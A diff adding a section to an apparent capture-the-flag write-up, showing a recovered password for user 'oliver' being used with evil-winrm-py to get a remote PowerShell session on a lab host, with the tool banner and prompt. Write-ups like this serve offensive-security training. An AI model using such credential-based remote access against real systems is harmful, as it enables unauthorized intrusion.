@@ -239,3 +239,19 @@ c1cdfun_d2434
 
 Found a password `c1cdfun_d2434`
 
+# Access over evil-winrm
+
+```python
+evil-winrm-py -i 10.129.62.43 -u oliver -p 'c1cdfun_d2434'                             
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to '10.129.62.43:5985' as 'oliver'
+evil-winrm-py PS C:\Users\oliver\Documents>
+```
+
+i can authenticate over winrm
+
